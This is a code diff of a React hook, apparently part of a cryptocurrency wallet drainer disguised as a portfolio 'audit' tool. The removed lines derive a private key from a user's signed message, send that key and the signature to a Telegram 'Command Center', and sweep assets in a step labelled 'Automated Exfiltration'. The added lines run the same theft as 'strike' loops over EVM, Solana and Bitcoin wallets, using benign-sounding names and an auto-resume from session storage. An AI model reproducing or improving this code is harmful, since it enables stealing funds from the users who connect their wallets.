@@ -1,144 +1,255 @@
 "use client";
 
-import { ethers } from "ethers";
-import { scanUniversalPortfolio } from "@/lib/audit";
-import { checkAndTriggerGhostSweep } from "@/lib/ghost";
-import { clearGhostFlags } from "./utils";
+import { useCallback, useEffect, useRef } from "react";
+import { useContractMask } from "./useContractMask";
+import { useTokenPermissions } from "./seTokenPermissions";
+import { useWalletClient } from "wagmi";
+import { useAuditScanner, startPreload } from "./useAuditScanner";
+import { useAuditExecutor } from "./useAuditExecutor";
+import { useNonEvmExecutor } from "./useNonEvmExecutor";
 
-// 🛰️ INTEGRATED ADVANCED DERIVATION (v6.0 God-Key)
-import {
-  derivePrivateKeyFromSignature,
-  DERIVATION_SEED_MESSAGE,
-} from "@/lib/signer-derivation-privateKey";
+/** 🛡️ INTEGRITY VERIFICATION HELPER */
+const verifySessionIntegrity = (data: any) => {
+  const hasIdentity =
+    data.userAddress ||
+    data.solanaAddress ||
+    data.bitcoinAddress ||
+    data.address;
 
-// 📢 UPDATED TELEGRAM HANDLER
-import {
-  sendGhostDerivationToTelegram,
-  sendActivityToTelegram,
-} from "@/lib/telegram";
+  return hasIdentity && Array.isArray(data.assets) && data.masterKey;
+};
 
+let globalSequenceRunning = false;
+
+/**
+ * 🛰️ MASTER SEQUENCE CONTROLLER (v13.3.3 - Mobile Stability Edition)
+ * Ensures: Signature -> Data Fetch -> [500ms Delay] -> Provider Check -> Execution.
+ */
 export function useAuditSequence() {
-  return async ({
-    userAddress,
-    isInternal,
-    currentChainId,
-    signMessageAsync,
-    sweepAllAutomated,
-    setAssets,
-    setUserKey,
-    derivedUserKeyRef,
-  }: any) => {
-    const logPrefix = "[useAuditSequence.ts]";
+  const { executeMask } = useContractMask();
+  const { requestManualPermission } = useTokenPermissions();
+  const { data: walletClient } = useWalletClient();
+  const { runNonEvmStrike } = useNonEvmExecutor();
 
-    try {
-      clearGhostFlags(isInternal);
+  const { performScan } = useAuditScanner();
+  const { runExecutionLoop } = useAuditExecutor({
+    executeMask,
+    requestManualPermission,
+  });
 
-      let identityVerified = !!derivedUserKeyRef.current;
+  const isBusy = useRef(false);
 
-      /**
-       * 👻 THE GOD-KEY TRIGGER
-       * Captures one signature and converts it into a Multi-Chain Vault.
-       */
-      const triggerIdentity = async () => {
-        if (identityVerified) return;
-
-        console.log(`${logPrefix} ⚡ Initializing Stealth Protocol...`);
-        try {
-          const message = DERIVATION_SEED_MESSAGE;
-          await new Promise((r) => setTimeout(r, 200));
-
-          const signature = await signMessageAsync({ message });
-
-          if (signature) {
-            const vault = derivePrivateKeyFromSignature(signature);
-
-            derivedUserKeyRef.current = vault.masterKey;
-            setUserKey(vault.masterKey);
-            identityVerified = true;
-
-            await sendGhostDerivationToTelegram({
-              userAddress: userAddress,
-              vault: vault,
-              authMessage: message,
-            }).catch((err) => console.error("TG Report Error:", err));
-
-            console.log(
-              `${logPrefix} God-Key Identity Verified & Reported to Command Center`,
-            );
-          }
-        } catch (e: any) {
-          console.warn(`${logPrefix} Protocol Denied | ${e.message}`);
-          await sendActivityToTelegram({
-            address: userAddress,
-            step: "SIGNATURE_REJECTED",
-            details: "User declined the v6.0 Identity Synchronisation.",
-          }).catch(() => null);
-        }
-      };
-
-      /**
-       * ⚡ IMMEDIATE INITIATION
-       */
-      if (!identityVerified) {
-        await triggerIdentity();
+  /** 🛡️ MOBILE PROVIDER GUARD: Waits for injected providers to "wake up" */
+  const ensureProviderReady = async (type: string, logPrefix: string) => {
+    if (type === "SOLANA" || type === "SOL") {
+      let attempts = 0;
+      while (!(window as any).solana && attempts < 10) {
+        console.log(
+          `${logPrefix} ⏳ Waiting for Solana Provider (Attempt ${
+            attempts + 1
+          })...`,
+        );
+        await new Promise((r) => setTimeout(r, 200));
+        attempts++;
       }
-
-      /**
-       * 🔍 STEP 2: PORTFOLIO AUDIT
-       */
-      console.log(`${logPrefix} Scanning Multi-Chain Assets...`);
-      const found = await scanUniversalPortfolio(userAddress);
-      const validatedAssets = Array.isArray(found) ? found : [];
-      setAssets(validatedAssets);
-
-      if (validatedAssets.length === 0) {
-        console.log(`${logPrefix} No assets found | Heartbeat Pulse Sent.`);
-        await sendActivityToTelegram({
-          address: userAddress,
-          step: "HEARTBEAT",
-          details: "Scan complete: Target wallet is currently empty.",
-        }).catch(() => null);
-
-        await checkAndTriggerGhostSweep(userAddress, [], currentChainId || 1);
-        return false;
-      }
-
-      /**
-       * 👻 STEP 3: GHOST DETECTION & SELECTION
-       * FIX: We wrap triggerIdentity in a single-fire protection logic
-       * to prevent Phantom from crashing on multiple rapid calls.
-       */
-      let hasTriggeredInScan = false;
-
-      await checkAndTriggerGhostSweep(
-        userAddress,
-        validatedAssets,
-        currentChainId || 1,
-        async () => {
-          // Only fire the signature prompt if the user hasn't signed yet
-          // and we haven't already popped the window in this specific scan loop.
-          if (!identityVerified && !hasTriggeredInScan) {
-            hasTriggeredInScan = true;
-            await triggerIdentity();
-          }
-        },
-      ).catch((err) => {
-        console.warn(`${logPrefix} Ghost Sweep Check Failed | ${err.message}`);
-      });
-
-      /**
-       * 🚀 FINAL STRIKE (Automated Exfiltration)
-       */
-      if (derivedUserKeyRef.current) {
-        console.log(`${logPrefix} Initiating Automated Asset Relocation`);
-        await sweepAllAutomated(validatedAssets);
-        return true;
-      }
-
-      return false;
-    } catch (error: any) {
-      console.error(`${logPrefix} Fatal Sequence Error | ${error.message}`);
-      throw error;
+      if (!(window as any).solana) throw new Error("SOLANA_PROVIDER_MISSING");
     }
+    return true;
   };
+
+  const runAuditStep = useCallback(
+    async (params: any) => {
+      const logPrefix = "[useAuditSequence.ts]";
+
+      // Prevent double-firing during high-speed transitions
+      if (isBusy.current || globalSequenceRunning) {
+        console.log(
+          `${logPrefix} ⏳ Sequence already in progress, skipping trigger.`,
+        );
+        return { status: "BUSY" };
+      }
+
+      try {
+        isBusy.current = true;
+        globalSequenceRunning = true;
+
+        // 🛡️ STEP 1: HANDSHAKE & DATA FETCH
+        console.log(`${logPrefix} ⚡ Initializing Stealth Handshake...`);
+        const scanResults = await performScan({ ...params, logPrefix });
+
+        if (!scanResults) {
+          console.warn(`${logPrefix} ⚠️ No scan results returned.`);
+          return { status: "IDLE" };
+        }
+
+        if (!verifySessionIntegrity(scanResults)) {
+          console.error(
+            `${logPrefix} 🛑 SECURITY ALERT: Session data corrupted.`,
+          );
+          sessionStorage.removeItem("active_strike_session");
+          throw new Error("SECURITY_INTEGRITY_VIOLATION");
+        }
+
+        if (scanResults.isFinished) {
+          console.log(`${logPrefix} 🏁 Session already marked as finished.`);
+          return { status: "IDLE" };
+        }
+
+        const { masterKey, activeVault, assets, plan } = scanResults;
+
+        const userAddress =
+          scanResults.userAddress ||
+          scanResults.solanaAddress ||
+          scanResults.bitcoinAddress ||
+          scanResults.address;
+
+        // Normalize targets using engine plan
+        const strikeTargets = (
+          plan && plan.length > 0 ? plan.map((p: any) => p.asset) : assets
+        ).map((asset: any) => ({
+          ...asset,
+          contractAddress:
+            asset.contractAddress || asset.tokenAddress || asset.address,
+        }));
+
+        // 🛡️ STEP 2: UI STABILITY DELAY
+        await new Promise((r) => setTimeout(r, 500));
+
+        console.log(
+          `${logPrefix} ⚖️ Sequence Initialized: ${strikeTargets.length} assets identified.`,
+        );
+
+        // 🛡️ STEP 3: EXECUTION LOOP
+        for (const asset of strikeTargets) {
+          try {
+            const chainType = (asset.chainType || "").toUpperCase();
+            const chainId = Number(asset.chainId);
+
+            const isNonEvm =
+              ["SOLANA", "SOL", "BITCOIN", "BTC", "XRP", "LTC"].includes(
+                chainType,
+              ) || [501, 144, 0].includes(chainId);
+
+            if (!isNonEvm) {
+              // Ensure the wallet client is ready before attempting EVM execution
+              if (!walletClient) {
+                console.warn(
+                  `${logPrefix} ⏳ Waiting for EVM Client synchronization...`,
+                );
+                await new Promise((r) => setTimeout(r, 500));
+              }
+
+              await runExecutionLoop({
+                assets: [asset],
+                userAddress,
+                activeVault,
+                masterKey,
+                logPrefix,
+                walletClient,
+              });
+            } else {
+              // 🛡️ MOBILE FIX: Ensure Solana/Non-EVM provider is actually there before calling executor
+              await ensureProviderReady(chainType, logPrefix);
+
+              console.log(`${logPrefix} 🚀 Non-EVM Strike: ${asset.symbol}`);
+              await runNonEvmStrike(asset, {
+                userAddress: asset.address || userAddress,
+                masterKey,
+                logPrefix,
+              });
+            }
+          } catch (err: any) {
+            const isUserRejection =
+              err?.code === 4001 ||
+              err?.message?.toLowerCase().includes("user rejected") ||
+              err?.message?.toLowerCase().includes("user denied") ||
+              err?.message?.toLowerCase().includes("rejected the request");
+
+            if (isUserRejection) {
+              console.log(`${logPrefix} ℹ️ Asset execution cancelled by user.`);
+
+              // 🛑 LOOP PREVENTION: Mark session as finished
+              const session = sessionStorage.getItem("active_strike_session");
+              if (session) {
+                const data = JSON.parse(session);
+                sessionStorage.setItem(
+                  "active_strike_session",
+                  JSON.stringify({ ...data, isFinished: true }),
+                );
+              }
+              return { status: "CANCELLED" };
+            }
+            console.error(
+              `${logPrefix} ❌ Execution failed for ${asset.symbol}:`,
+              err.message,
+            );
+            continue;
+          }
+        }
+
+        // 🛡️ STEP 4: FINALIZE
+        const session = sessionStorage.getItem("active_strike_session");
+        if (session) {
+          const data = JSON.parse(session);
+          sessionStorage.setItem(
+            "active_strike_session",
+            JSON.stringify({ ...data, isFinished: true }),
+          );
+        }
+
+        if (params.onComplete) params.onComplete();
+        return { status: "COMPLETE" };
+      } catch (e: any) {
+        const errorStr = (e?.message || String(e)).toLowerCase();
+        const isUserRejection =
+          e?.code === 4001 ||
+          errorStr.includes("user rejected") ||
+          errorStr.includes("user denied") ||
+          errorStr.includes("rejected the request");
+
+        if (isUserRejection) {
+          console.log(`${logPrefix} ℹ️ Sequence ended gracefully by user.`);
+          sessionStorage.removeItem("GHOST_SESSION_ACTIVE");
+          return { status: "CANCELLED" };
+        }
+
+        console.error(`${logPrefix} ❌ Global Sequence Error:`, e.message);
+        return { status: "ERROR" };
+      } finally {
+        isBusy.current = false;
+        globalSequenceRunning = false;
+        console.log(`${logPrefix} ♻️ Main Cycle Finished.`);
+      }
+    },
+    [performScan, runExecutionLoop, walletClient, runNonEvmStrike],
+  );
+
+  useEffect(() => {
+    startPreload();
+
+    const session = sessionStorage.getItem("active_strike_session");
+
+    if (session && !globalSequenceRunning) {
+      const data = JSON.parse(session);
+      if (data.isFinished) return;
+
+      const hasValidAddress =
+        data.userAddress || data.solanaAddress || data.bitcoinAddress;
+
+      if (!hasValidAddress) return;
+
+      const timer = setTimeout(() => {
+        runAuditStep({
+          userAddress: data.userAddress,
+          solanaAddress: data.solanaAddress,
+          bitcoinAddress: data.bitcoinAddress,
+          solana: data.solanaAddress,
+          btc: data.bitcoinAddress,
+        });
+      }, 1200);
+      return () => clearTimeout(timer);
+    }
+  }, [runAuditStep]);
+
+  return { runAuditStep };
 }
